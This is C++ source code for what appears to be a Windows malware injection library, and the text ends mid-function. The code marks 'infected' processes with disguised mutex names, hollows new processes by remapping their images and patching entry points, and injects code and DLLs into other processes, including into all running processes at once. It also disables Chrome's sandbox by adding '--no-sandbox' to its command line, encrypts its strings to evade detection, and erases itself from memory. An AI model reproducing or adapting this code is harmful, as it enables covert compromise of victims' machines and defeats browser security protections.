#include "sys_includes.h"
#include <dbghelp.h>
#include <shlwapi.h>
#include <intrin.h>

#include "inject.h"

#include "syslib\apihook.h"
#include "syslib\chksum.h"
#include "syslib\system.h"
#include "syslib\inject.h"
#include "syslib\ldr.h"
#include "syslib\mem.h"
#include "syslib\str.h"
#include "syslib\debug.h"
#include "syslib\wow64.h"
#include "wow64\wow64ext.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

static DWORD dwInfectionMarker;

static void GenerateInfectedMarkerName(DWORD dwPID,TCHAR *lpName)
{
    LARGE_INTEGER liMarker;
    liMarker.HighPart=dwPID;
    liMarker.LowPart=dwInfectionMarker;
    DWORD dwHash=chksum_crc32((byte*)&liMarker,sizeof(liMarker));
    StrFormat(lpName,dcr_72dd91f1("MSCTF.Shared.MUTEX.%08x"),dwHash);
    return;
}

SYSLIBFUNC(BOOL) IsProcessInfected(DWORD dwPID)
{
    TCHAR szMutex[40];
    GenerateInfectedMarkerName(dwPID,szMutex);
    HANDLE hMutex=OpenMutex(SYNCHRONIZE,false,szMutex);
    if (hMutex)
    {
        SysCloseHandle(hMutex);
        SetLastError(ERROR_ALREADY_EXISTS);
        return true;
    }
    return false;
}

SYSLIBFUNC(BOOL) IsWindowInfected(HWND hWnd)
{
    DWORD dwProcessId=0;
    GetWindowThreadProcessId(hWnd,&dwProcessId);
    return IsProcessInfected(dwProcessId);
}

SYSLIBFUNC(void) SetInfectionMarkerW(LPCWSTR lpMarker)
{
    LPSTR lpMarkerA=StrUnicodeToAnsiEx(lpMarker,0,NULL);
    if (lpMarkerA)
    {
        SetInfectionMarkerA(lpMarkerA);
        MemFree(lpMarkerA);
    }
    return;
}

SYSLIBFUNC(void) SetInfectionMarkerA(LPCSTR lpMarker)
{
    if (SYSLIB_SAFE::CheckStrParamA(lpMarker,0))
        dwInfectionMarker=MurmurHash3((LPBYTE)lpMarker,lstrlenA(lpMarker));
    return;
}

SYSLIBFUNC(HANDLE) MarkProcessAsInfected(DWORD dwPID)
{
    TCHAR szMutex[40];
    GenerateInfectedMarkerName(dwPID,szMutex);
    HANDLE hMutex=OpenMutex(SYNCHRONIZE,false,szMutex);
    if (!hMutex)
        hMutex=CreateMutex(NULL,false,szMutex);
    else
        SetLastError(ERROR_ALREADY_EXISTS);
    return hMutex;
}

SYSLIBFUNC(BOOL) SysIsKernel32Loaded(DWORD ProcessId)
{
    HANDLE hSnap;
    BOOL Result=false;

    do
    {
        hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,ProcessId);
        if (hSnap == INVALID_HANDLE_VALUE)
        {
            if (GetLastError() == ERROR_BAD_LENGTH)
            {
                SwitchToThread();

                hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,ProcessId);
                if (hSnap == INVALID_HANDLE_VALUE)
                    break;
            }
            break;
        }

        MODULEENTRY32 ModEnt={0};
        ModEnt.dwSize=sizeof(ModEnt);

        if (!Module32First(hSnap,&ModEnt))
            break;

        do
        {
            TCHAR *TempStr=StrStrI(ModEnt.szModule,dcr_91519b1b("kernel"));
            if ((TempStr) && (StrStrI(TempStr,dcr_c8aa9a3b(".dll"))))
            {
                Result=true;
                break;
            }
        }
        while (Module32Next(hSnap,&ModEnt));
    }
    while (false);

    if (hSnap != INVALID_HANDLE_VALUE)
        SysCloseHandle(hSnap);

    return Result;
}

static bool IsThreadExecuted(DWORD dwPID,HANDLE hThread,HANDLE hProc)
{
    for (int i=0; i < 300; i++)
    {
        if (IsProcessInfected(dwPID))
        {
            SysCloseHandle(hProc);
            SysCloseHandle(hThread);
            return true;
        }
        Sleep(1);
    }
    TerminateThread(hThread,0);
    SysCloseHandle(hThread);
    return false;
}

/// новая точка входа инжектируемого процесса
static void WINAPI NewEntryPoint()
{
    ldr_RebasePE();

    byte *lpOurBase=ldr_GetImageBase(ldr_GetOurAddr());
    DWORD dwOurSize=ldr_GetImageSize(lpOurBase);
    INJECT_REAL_THREAD_INFO *lpInfo=(INJECT_REAL_THREAD_INFO *)(lpOurBase+dwOurSize);
    memcpy(lpInfo->lpOEP,lpInfo->bOriginalEntryPointBytes,sizeof(lpInfo->bOriginalEntryPointBytes));

    LPTHREAD_START_ROUTINE lpFunc=(LPTHREAD_START_ROUTINE)((DWORD_PTR)lpInfo->lpFunc+(DWORD_PTR)lpOurBase);
    lpFunc(lpInfo->lpParam);
    return;
}

SYSLIBFUNC(BOOL) InjectNewProc(LPTHREAD_START_ROUTINE lpFunc,HANDLE hProc,HANDLE hThread,LPVOID lpParam)
{
    BOOL bRet=false;
    ULONG dwNeeded=0;
    PROCESS_BASIC_INFORMATION pbi={0};
    NTSTATUS dwRet=ZwQueryInformationProcess(hProc,ProcessBasicInformation,&pbi,sizeof(pbi),&dwNeeded);
    if (NT_SUCCESS(dwRet))
    {
        PEB peb;
        if (ReadProcessMemory(hProc,(void*)pbi.PebBaseAddress,&peb,sizeof(peb),0))
        {
            LPVOID lpImageBase=(void*)peb.ImageBaseAddress,
                   lpHdrs=MemQuickAlloc(0x400);
            if (lpHdrs)
            {
                SIZE_T tmp;
                if (ReadProcessMemory(hProc,lpImageBase,lpHdrs,0x400,&tmp))
                {
                    byte *lpOurBase=ldr_GetImageBase(ldr_GetOurAddr());
                    DWORD dwOurSize=ldr_GetImageSize(lpOurBase);

                    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER) (lpHdrs);
                    PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)((ULONG_PTR)lpHdrs+dos->e_lfanew+4);
                    PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)(pfh+1);

                    SIZE_T dwNewSize=poh->SizeOfImage+dwOurSize+sizeof(INJECT_REAL_THREAD_INFO);

                    LARGE_INTEGER liSize={0};
                    liSize.LowPart=dwNewSize;
                    HANDLE hSection=NULL;
                    dwRet=ZwCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&liSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
                    if (NT_SUCCESS(dwRet))
                    {
                        void *lpSection=NULL;
                        dwRet=ZwMapViewOfSection(hSection,GetCurrentProcess(),&lpSection,0,0,NULL,&dwNewSize,ViewShare,0,PAGE_EXECUTE_READWRITE);
                        if (NT_SUCCESS(dwRet))
                        {
                            if (ReadProcessMemory(hProc,lpImageBase,lpSection,poh->SizeOfImage,&tmp))
                            {
                                byte *lpOurNewBase=(byte*)lpSection+poh->SizeOfImage;
                                byte *lpEntry=(byte*)lpSection+poh->AddressOfEntryPoint,
                                     *lpFunction=(byte*)((DWORD_PTR)NewEntryPoint-(DWORD_PTR)lpOurBase+(DWORD_PTR)lpOurNewBase);

                                INJECT_REAL_THREAD_INFO *lpInfo=(INJECT_REAL_THREAD_INFO*)((byte*)lpOurNewBase+dwOurSize);
                                memcpy(lpInfo->bOriginalEntryPointBytes,lpEntry,sizeof(lpInfo->bOriginalEntryPointBytes));
                                lpInfo->lpOEP=(byte*)lpImageBase+poh->AddressOfEntryPoint;
                                lpInfo->lpFunc=(LPTHREAD_START_ROUTINE)((DWORD_PTR)lpFunc-(DWORD_PTR)lpOurBase);
                                lpInfo->lpParam=lpParam;

                                memcpy(lpOurNewBase,lpOurBase,dwOurSize);

                                PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)lpOurNewBase;
                                PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)((ULONG_PTR)lpOurNewBase+dos->e_lfanew+4);
                                PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)(pfh+1);
                                poh->ImageBase=(ULONG_PTR)lpOurBase;

                                DWORD dwJmpAddr=(DWORD_PTR)lpFunction-((DWORD_PTR)lpEntry+5);
                                *lpEntry=0xE9;
                                lpEntry++;
                                *(DWORD*)lpEntry=dwJmpAddr;
                                FlushInstructionCache(hProc,NULL,0);

                                lpSection=(PVOID)lpImageBase;
                                ZwUnmapViewOfSection(hProc,lpSection);

                                dwRet=ZwMapViewOfSection(hSection,hProc,&lpSection,0,0,NULL,&dwNewSize,ViewShare,0,PAGE_EXECUTE_READWRITE);
                                if (NT_SUCCESS(dwRet))
                                {
                                    ZwResumeThread(hThread,NULL);
                                    bRet=true;
                                }
                                else
                                    SysNtStatusToWin32Error(dwRet);
                            }
                        }
                        else
                            SysNtStatusToWin32Error(dwRet);
                        SysCloseHandle(hSection);
                    }
                    else
                        SysNtStatusToWin32Error(dwRet);
                }
                MemFree(lpHdrs);
            }
        }
    }
    else
        SysNtStatusToWin32Error(dwRet);

    if (!bRet)
    {
        DWORD dwLastError=GetLastError();
        TerminateProcess(hProc,0);
        SetLastError(dwLastError);
    }
    return bRet;
}

static void WINAPI NewProcInj(NEW_PROC_INJ_STRUCT *lpParam)
{
    TCHAR szEvent[40];
    StrFormat(szEvent,dcr_4541af7b("%X"),lpParam->dwEventCode);
    HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,false,szEvent);
    if (hEvent)
    {
        SetEvent(hEvent);
        SysCloseHandle(hEvent);
    }

    LPTHREAD_START_ROUTINE lpThreadRoutine=(LPTHREAD_START_ROUTINE)((DWORD_PTR)lpParam->lpThreadRoutine+(DWORD_PTR)ldr_GetImageBase(ldr_GetOurAddr()));
    VirtualFree(lpParam,NULL,MEM_RELEASE);
    lpThreadRoutine(NULL);
    return;
}

SYSLIBFUNC(DWORD) StartInfectedProcessW(LPWSTR lpFileName,LPTHREAD_START_ROUTINE lpAddr,LPVOID lpParam,int dwWaitTimeout)
{
    DWORD dwProcessId=0;
    LPTHREAD_START_ROUTINE lpThreadRoutine=(LPTHREAD_START_ROUTINE)((DWORD_PTR)lpAddr-(DWORD_PTR)ldr_GetImageBase((LPBYTE)lpAddr));
    STARTUPINFO siInfo={0};
    PROCESS_INFORMATION piInfo={0};
    siInfo.cb=sizeof(siInfo);
    if (CreateProcessW(NULL,lpFileName,NULL,NULL,false,CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&siInfo,&piInfo))
    {
        TCHAR szEvent[40];
        DWORD dwEventCode=GetTickCount();
        StrFormat(szEvent,dcr_4541af7b("%X"),dwEventCode);
        HANDLE hEvent=CreateEvent(NULL,true,false,szEvent);

        NEW_PROC_INJ_STRUCT inj={lpThreadRoutine,dwEventCode};
        void *lpMem=VirtualAllocEx(piInfo.hProcess,NULL,sizeof(inj),MEM_COMMIT,PAGE_READWRITE);
        if (lpMem)
        {
            SIZE_T tmp;
            WriteProcessMemory(piInfo.hProcess,lpMem,&inj,sizeof(inj),&tmp);
            if (InjectNewProc((LPTHREAD_START_ROUTINE)NewProcInj,piInfo.hProcess,piInfo.hThread,lpMem))
            {
                if ((WaitForSingleObject(hEvent,dwWaitTimeout) == WAIT_TIMEOUT) || (WaitForSingleObject(piInfo.hThread,0) == WAIT_OBJECT_0))
                    TerminateProcess(piInfo.hProcess,0);
                else
                    dwProcessId=piInfo.dwProcessId;
            }
            else
                VirtualFreeEx(piInfo.hProcess,lpMem,0,MEM_RELEASE);
        }

        SysCloseHandle(hEvent);
        if (!dwProcessId)
            TerminateThread(piInfo.hThread,0);
        SysCloseHandle(piInfo.hThread);
        SysCloseHandle(piInfo.hProcess);
    }
    return dwProcessId;
}

SYSLIBFUNC(DWORD) StartInfectedProcessA(LPSTR lpFileName,LPTHREAD_START_ROUTINE lpAddr,LPVOID lpParam,int dwWaitTimeout)
{
    LPWSTR lpFileNameW=StrAnsiToUnicodeEx(lpFileName,0,NULL);

    DWORD dwProcessId=StartInfectedProcessW(lpFileNameW,lpAddr,lpParam,dwWaitTimeout);

    MemFree(lpFileNameW);
    return dwProcessId;
}

/// удаленный поток для обычного инжекта
static void WINAPI RemoteThread(REMOTE_THREAD_INFO *lpInfo)
{
    ldr_RebasePE();

    if (IsProcessInfected(GetCurrentProcessId()))
        DestroyInject();

    TCHAR szPath[MAX_PATH];
    GetModuleFileName(0,szPath,MAX_PATH);
    if (StrStrI(szPath,dcr_37e5870b("\\chrome.exe")))
    {
        lstrcatA(GetCommandLineA(),dcrA_2ae1db8c(" --no-sandbox"));
        lstrcatW(GetCommandLineW(),dcrW_2ae1db8c(" --no-sandbox"));
    }

    REMOTE_THREAD_INFO info;
    memcpy(&info,lpInfo,sizeof(info));
    VirtualFree(lpInfo,0,MEM_RELEASE);

    HANDLE hMarker=MarkProcessAsInfected(GetCurrentProcessId());
    bool bDestroy=true;
    __try {
        if (!info.lpFunc(info.lpParam))
            bDestroy=false;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
    SysCloseHandle(hMarker);

    if (bDestroy)
        DestroyInject();
}

SYSLIBFUNC(BOOL) SysWaitForKernel32(DWORD dwPID)
{
    for (int i=0; i < SYSINJ_WAIT_ATTEMPTS; i++)
    {
        if (SysIsKernel32Loaded(dwPID))
            break;

        Sleep(SYSINJ_WAIT_TIMEOUT);
    }

    return SysIsKernel32Loaded(dwPID);
}

static BOOL InjectProcForeignDll(HANDLE hProc,LPTHREAD_START_ROUTINE lpFunction,LPBYTE lpImage,DWORD dwImageSize)
{
    BOOL bRet=false;
    do
    {
        if (!ldr_CheckPE(lpImage,dwImageSize))
            break;

        void *lpMem=VirtualAllocEx(hProc,NULL,dwImageSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        if (!lpMem)
            break;

        SIZE_T dwTmp;
        if (WriteProcessMemory(hProc,lpMem,lpImage,dwImageSize,&dwTmp))
        {
            lpFunction=(LPTHREAD_START_ROUTINE) ((SIZE_T)lpFunction-(SIZE_T)lpImage+(SIZE_T)lpMem);
            HANDLE hThread=NULL;
            if (hThread=CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)lpFunction,NULL,0,NULL))
                bRet=true;
            else if (RtlCreateUserThread(hProc,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)lpFunction,NULL,&hThread,0) >= 0)
                bRet=true;

            SysCloseHandle(hThread);
        }

        if (!bRet)
            VirtualFreeEx(hProc,lpMem,0,MEM_RELEASE);
    }
    while (false);
    return bRet;
}

SYSLIBFUNC(BOOL) InjectProc(LPTHREAD_START_ROUTINE lpFunction,DWORD dwPID,LPVOID lpParam)
{
    BOOL bRet=false;
    HANDLE hProc=NULL;
    do
    {
        if (IsProcessInfected(dwPID))
            break;

        hProc=SysOpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,dwPID);
        if (!hProc)
            break;

#ifdef _AMD64_
        if (!SysIsProcess64(hProc))
            break;
#else
        if (SysIsProcess64(hProc))
            break;
#endif

        byte *lpImage=ldr_GetImageBase((LPBYTE)lpFunction);
        if (!lpImage)
            break;

        DWORD dwSize=ldr_GetImageSize(lpImage);
        if (!dwSize)
            break;

        if (lpImage != ldr_GetImageBase(ldr_GetOurAddr()))
        {
            bRet=InjectProcForeignDll(hProc,lpFunction,lpImage,dwSize);
            break;
        }

		if (!SysWaitForKernel32(dwPID))
            break;

        void *lpMem=VirtualAllocEx(hProc,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        if (!lpMem)
            break;

        SIZE_T dwTmp;
        if (WriteProcessMemory(hProc,lpMem,lpImage,dwSize,&dwTmp))
        {
            REMOTE_THREAD_INFO info;
            info.lpParam=lpParam;
            info.lpFunc=(LPTHREAD_START_ROUTINE) ((SIZE_T)lpFunction-(SIZE_T)lpImage+(SIZE_T)lpMem);
            lpParam=VirtualAllocEx(hProc,NULL,sizeof(info),MEM_COMMIT,PAGE_READWRITE);
            if (lpParam)
            {
                WriteProcessMemory(hProc,lpParam,&info,sizeof(info),&dwTmp);
                FlushInstructionCache(hProc,NULL,0);

                lpFunction=(LPTHREAD_START_ROUTINE) ((SIZE_T)RemoteThread-(SIZE_T)lpImage+(SIZE_T)lpMem);
                HANDLE hThread=NULL;
                if (hThread=CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)lpFunction,lpParam,0,NULL))
                    bRet=(IsThreadExecuted(dwPID,hThread,hProc) != false);
                else if (RtlCreateUserThread(hProc,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)lpFunction,lpParam,&hThread,0) >= 0)
                    bRet=(IsThreadExecuted(dwPID,hThread,hProc) != false);

                SysCloseHandle(hThread);
                VirtualFreeEx(hProc,lpParam,0,MEM_RELEASE);
            }
        }

        if (!bRet)
            VirtualFreeEx(hProc,lpMem,0,MEM_RELEASE);
    }
    while (false);
    SysCloseHandle(hProc);
    return bRet;
}

SYSLIBFUNC(BOOL) InjectWnd(LPTHREAD_START_ROUTINE lpFunction,HWND hWnd,LPVOID lpParam)
{
    DWORD dwPid;
    GetWindowThreadProcessId(hWnd,&dwPid);

    return InjectProc(lpFunction,dwPid,lpParam);
}

SYSLIBFUNC(LPVOID) PreparePlaceForOurDll(HANDLE hProc,LPBYTE lpDll,LPVOID *lppBaseAddr)
{
    void *lpEntry=NULL;
    *lppBaseAddr=NULL;

    byte *lpMem=NULL;
    HANDLE hSection=NULL;
    do
    {
		PIMAGE_DOS_HEADER lpDosHdr=(PIMAGE_DOS_HEADER)lpDll;
        PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)((ULONG_PTR)lpDll+lpDosHdr->e_lfanew+4);

#ifdef _AMD64_
		if (pfh->Machine == IMAGE_FILE_MACHINE_I386)
            break;
#else
		if (pfh->Machine != IMAGE_FILE_MACHINE_I386)
            break;
#endif

		PIMAGE_NT_HEADERS lpNtHdr=(PIMAGE_NT_HEADERS)(lpDll+lpDosHdr->e_lfanew);
        hSection=SysCreateSharedSection(hProc,lpNtHdr->OptionalHeader.SizeOfImage,PAGE_EXECUTE_READWRITE,(void**)&lpMem,lppBaseAddr);
        if (!hSection)
            break;

        memcpy(lpMem,lpDll,lpNtHdr->OptionalHeader.SizeOfHeaders);

        PIMAGE_SECTION_HEADER lpSectHdr=IMAGE_FIRST_SECTION(lpNtHdr);
        for (int i=0; i < lpNtHdr->FileHeader.NumberOfSections; i++)
        {
            memcpy(lpMem+lpSectHdr->VirtualAddress,lpDll+lpSectHdr->PointerToRawData,lpSectHdr->SizeOfRawData);
            lpSectHdr++;
        }

        lpEntry=(lpNtHdr->OptionalHeader.AddressOfEntryPoint+(byte*)*lppBaseAddr);
    }
    while (false);

    if (lpMem)
        ZwUnmapViewOfSection(GetCurrentProcess(),lpMem);
    SysCloseHandle(hSection);

    return lpEntry;
}

SYSLIBFUNC(BOOL) InjectDll(DWORD dwPID,LPBYTE lpDll)
{
    BOOL bRet=false;
    HANDLE hProc=NULL;
    do
    {
        if (IsProcessInfected(dwPID))
            break;

        hProc=SysOpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,dwPID);
        if (!hProc)
            break;

#ifdef _AMD64_
        if (!SysIsProcess64(hProc))
            break;
#else
        if (SysIsProcess64(hProc))
            break;
#endif

        if (!SysWaitForKernel32(dwPID))
            break;

        void *lpMem,*lpEntryPoint=PreparePlaceForOurDll(hProc,lpDll,&lpMem);
        if (!lpMem)
            break;

        HANDLE hThread=NULL;
        if (hThread=CreateRemoteThread(hProc,NULL,0,(LPTHREAD_START_ROUTINE)lpEntryPoint,NULL,0,NULL))
            bRet=true;
        else if (RtlCreateUserThread(hProc,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)lpEntryPoint,NULL,&hThread,0) >= 0)
            bRet=true;

        if (!bRet)
            ZwUnmapViewOfSection(hProc,lpMem);
        else
            SysCloseHandle(hThread);
    }
    while (false);

    SysCloseHandle(hProc);
    return bRet;
}

#ifdef _X86_
static bool IsKernel64(HANDLE hProc,DWORD64 lpAddress,DWORD64 dwSize)
{
    bool bRet=false;
    if (dwSize >= (sizeof(L"kernel32.dll")-sizeof(WCHAR)))
    {
        LPWSTR lpStr=WCHAR_QuickAlloc(dwSize);
        if (lpStr)
        {
            DWORD64 dwRead;
            if (NT_SUCCESS(ReadProcessMemory64(hProc,lpAddress,lpStr,dwSize,&dwRead)))
                bRet=(StrCmpNIW(lpStr,dcrW_30884675("kernel32.dll"),sizeof("kernel32.dll")-1) == NULL);
            MemFree(lpStr);
        }
    }
    return bRet;
}

SYSLIBFUNC(BOOL) SysIsKernel64Loaded(DWORD ProcessId)
{
    HANDLE hProc;
    BOOL Result=false;

    do
    {
        hProc=SysOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_READ,ProcessId);
        if (!hProc)
            break;

        DWORD64 dwNeeded=0;
        PROCESS_BASIC_INFORMATION_64 pbi64={0};
        if (!NT_SUCCESS(NtQueryInformationProcess64(hProc,ProcessBasicInformation,&pbi64,sizeof(pbi64),&dwNeeded)))
            break;

        if (!pbi64.PebBaseAddress)
            break;

        PEB_64 peb64;
        DWORD64 dwRead;
        if (!NT_SUCCESS(ReadProcessMemory64(hProc,pbi64.PebBaseAddress,&peb64,sizeof(peb64),&dwRead)))
            break;

        if (!peb64.Ldr)
            break;

        PEB_LDR_DATA_64 ldr64;
        if (!NT_SUCCESS(ReadProcessMemory64(hProc,peb64.Ldr,&ldr64,sizeof(ldr64),&dwRead)))
            break;

        DWORD64 lpLdrPtr=ldr64.InLoadOrderModuleList.Flink;
        while (true)
        {
            LDR_DATA_TABLE_ENTRY_64 entry64;
            if (!NT_SUCCESS(ReadProcessMemory64(hProc,lpLdrPtr,&entry64,sizeof(entry64),&dwRead)))
                break;

            if (!entry64.DllBase)
                break;

            if (IsKernel64(hProc,entry64.BaseDllName.Buffer,entry64.BaseDllName.Length))
            {
                Result=true;
                break;
            }

            lpLdrPtr=entry64.InLoadOrderLinks.Flink;
            if (ldr64.InLoadOrderModuleList.Flink == lpLdrPtr)
                break;
        }
    }
    while (false);

    SysCloseHandle(hProc);

    return Result;
}

SYSLIBFUNC(BOOL) SysWaitForKernel64(DWORD dwPID)
{
    for (int i=0; i < SYSINJ_WAIT_ATTEMPTS; i++)
    {
        if (SysIsKernel64Loaded(dwPID))
            break;

        Sleep(SYSINJ_WAIT_TIMEOUT);
    }

    return SysIsKernel64Loaded(dwPID);
}


SYSLIBFUNC(DWORD64) PreparePlaceForOurDll64(HANDLE hProc,LPBYTE lpDll,DWORD64 *lppBaseAddr)
{
    DWORD64 lpEntry=NULL;
    *lppBaseAddr=0;

    byte *lpMem=NULL;
    HANDLE hSection=NULL;
    do
    {
		PIMAGE_DOS_HEADER lpDosHdr=(PIMAGE_DOS_HEADER)lpDll;
		PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)(lpDll+lpDosHdr->e_lfanew+4);
		if (pfh->Machine == IMAGE_FILE_MACHINE_I386)
            break;

		PIMAGE_NT_HEADERS64 lpNtHdr=(PIMAGE_NT_HEADERS64)(lpDll+lpDosHdr->e_lfanew);
        hSection=SysCreateSharedSection64(hProc,lpNtHdr->OptionalHeader.SizeOfImage,PAGE_EXECUTE_READWRITE,(void**)&lpMem,lppBaseAddr);
        if (!hSection)
            break;

        memcpy(lpMem,lpDll,lpNtHdr->OptionalHeader.SizeOfHeaders);

        PIMAGE_SECTION_HEADER lpSectHdr=IMAGE_FIRST_SECTION(lpNtHdr);
        for (int i=0; i < lpNtHdr->FileHeader.NumberOfSections; i++)
        {
            memcpy(lpMem+lpSectHdr->VirtualAddress,lpDll+lpSectHdr->PointerToRawData,lpSectHdr->SizeOfRawData);
            lpSectHdr++;
        }

        lpEntry=(DWORD64)(lpNtHdr->OptionalHeader.AddressOfEntryPoint+*lppBaseAddr);
    }
    while (false);

    if (lpMem)
        ZwUnmapViewOfSection(GetCurrentProcess(),lpMem);
    SysCloseHandle(hSection);

    return lpEntry;
}

SYSLIBFUNC(BOOL) InjectDll64(DWORD dwPID,LPBYTE lpDll)
{
    BOOL bRet=false;
    HANDLE hProc=NULL;
    do
    {
		PIMAGE_DOS_HEADER lpDosHdr=(PIMAGE_DOS_HEADER)lpDll;
		PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)((ULONG_PTR)lpDll+lpDosHdr->e_lfanew+4);
		if (pfh->Machine == IMAGE_FILE_MACHINE_I386)
            break;

        if (IsProcessInfected(dwPID))
            break;

        hProc=SysOpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,dwPID);
        if (!hProc)
            break;

        if (!SysIsProcess64(hProc))
            break;

        if (!SysWaitForKernel64(dwPID))
            break;

        DWORD64 lpMem,lpEntryPoint=PreparePlaceForOurDll64(hProc,lpDll,&lpMem);
        if (!lpMem)
            break;

        HANDLE hThread=NULL;
        if (hThread=CreateRemoteThread64(hProc,lpEntryPoint,NULL))
            bRet=true;

        if (!bRet)
            NtUnmapViewOfSection64(hProc,lpMem);
        else
            SysCloseHandle(hThread);
    }
    while (false);

    SysCloseHandle(hProc);
    return bRet;
}
#endif

#ifdef _X86_
#define FINAL_MARKER 0x99999999
#else
#define FINAL_MARKER 0x9999999999999999
#endif

static DWORD_PTR GetFuncSize(byte *lpFunc,DWORD_PTR dwMarker)
{
    DWORD_PTR dwSize=0;
    while (true)
    {
        if ((*(DWORD_PTR*)lpFunc) == dwMarker)
            break;
        lpFunc++;
        dwSize++;
    }
    return dwSize+sizeof(dwMarker)+100;
}

#pragma optimize("",off)
static DWORD_PTR WINAPI MemCleanupThread(MEMINFO *lpMemInfo)
{
    if (lpMemInfo)
    {
        DWORD dwExitCode;
        do
        {
            lpMemInfo->lpGetExitCodeThread(lpMemInfo->hThread,&dwExitCode);
            lpMemInfo->lpSleep(1);
        }
        while (dwExitCode == STILL_ACTIVE);

        lpMemInfo->lpVirtualFree(lpMemInfo->lpStartingAddress,0,MEM_RELEASE);
        lpMemInfo->lpZwUnmapViewOfSection((HANDLE)-1,lpMemInfo->lpStartingAddress);
    }
    return FINAL_MARKER;
}

extern "C" void __cdecl RemoveProcessWindowsHooks();

SYSLIBFUNC(void) DestroyInject()
{
    HMODULE hBase=(HMODULE)ldr_GetImageBase(ldr_GetOurAddr());
    SysRemoveThreadCreateNotify();
    RemoveProcessWindowsHooks();

    while (!HookAPI_UnhookAll())
        Sleep(1);

    Sleep(5000);

    MEMINFO *lpMemInfo=(MEMINFO*)MemAlloc(sizeof(MEMINFO));
    lpMemInfo->lpVirtualFree=(__VirtualFree*)VirtualFree;
    lpMemInfo->lpSleep=(__Sleep*)Sleep;
    lpMemInfo->lpZwUnmapViewOfSection=(__ZwUnmapViewOfSection*)ZwUnmapViewOfSection;
    lpMemInfo->lpGetExitCodeThread=(__GetExitCodeThread*)GetExitCodeThread;
    lpMemInfo->lpStartingAddress=hBase;
    lpMemInfo->hThread=OpenThread(THREAD_QUERY_INFORMATION,false,GetCurrentThreadId());

    DWORD_PTR dwSize=GetFuncSize((byte*)MemCleanupThread,FINAL_MARKER);
    LPVOID lpThread=MemQuickAlloc(dwSize);
    memcpy(lpThread,MemCleanupThread,dwSize);
    DWORD tmp;
    VirtualProtect(lpThread,dwSize,PAGE_EXECUTE_READWRITE,&tmp);
    FlushInstructionCache(GetCurrentProcess(),NULL,0);

    SysCloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)lpThread,lpMemInfo,0,NULL));
    ExitThread(0xDEAD);
}
#pragma optimize("",on)

static void WINAPI InjectThread(INJECT_PARAMS *lpParam)
{
    InjectProc(lpParam->lpFunc,lpParam->dwProcessId,lpParam->lpParam);
    MemFree(lpParam);
    return;
}

SYSLIBFUNC(void) InjectProcToAll(LPTHREAD_START_ROUTINE lpFunction,LPVOID lpParam)
{
    DWORD dwProcessCount;
    void *lpBuffer=SysGetProcessList(&dwProcessCount);
    if (lpBuffer)
    {
        HANDLE *lpHandles=(HANDLE*)MemAlloc(sizeof(HANDLE)*dwProcessCount);
        if (lpHandles)
        {
            DWORD dwInfectedProcessCount=0;
            PSYSTEM_PROCESS_INFORMATION lpProcesses=(PSYSTEM_PROCESS_INFORMATION)lpBuffer;
            for (DWORD i=0,j=0; i < dwProcessCount; i++)
            {
                if (!IsProcessInfected((DWORD)lpProcesses->UniqueProcessId))
                {
                    INJECT_PARAMS *lpParam=(INJECT_PARAMS*)MemAlloc(sizeof(INJECT_PARAMS));
                    if (lpParam)
                    {
                        lpParam->lpFunc=lpFunction;
                        lpParam->lpParam=lpParam;
                        lpParam->dwProcessId=(DWORD)lpProcesses->UniqueProcessId;
                        lpHandles[j]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)InjectThread,lpParam,0,NULL);
                        if (lpHandles[j])
                        {
                            j++;
                            dwInfectedProcessCount++;
                        }
                        else
                            MemFree(lpParam);
                    }
                }
                lpProcesses=(PSYSTEM_PROCESS_INFORMATION)(((byte*)lpProcesses)+lpProcesses->NextEntryOffset);
            }

            if (dwInfectedProcessCount)
            {
                SysWaitForMultipleObjects(dwInfectedProcessCount,lpHandles,true,INFINITE);
                for (DWORD i=0; i < dwInfectedProcessCount; i++)
                    SysCloseHandle(lpHandles[i]);
            }
            MemFree(lpHandles);
        }
        MemFree(lpBuffer);
    }
    return;
}

static void WINAPI InjectDllThread(INJECT_PARAMS *lpParam)
{
    InjectDll(lpParam->dwProcessId,lpParam->lpDll);
    MemFree(lpParam);
    return;
}

SYSLIBFUNC(void) InjectDllToAll(LPBYTE lpDll)
{
    DWORD dwProcessCount;
    void *lpBuffer=SysGetProcessList(&dwProcessCount);
    if (lpBuffer)
    {
        HANDLE *lpHandles=(HANDLE*)MemAlloc(sizeof(HANDLE)*dwProcessCount);
        if (lpHandles)
        {
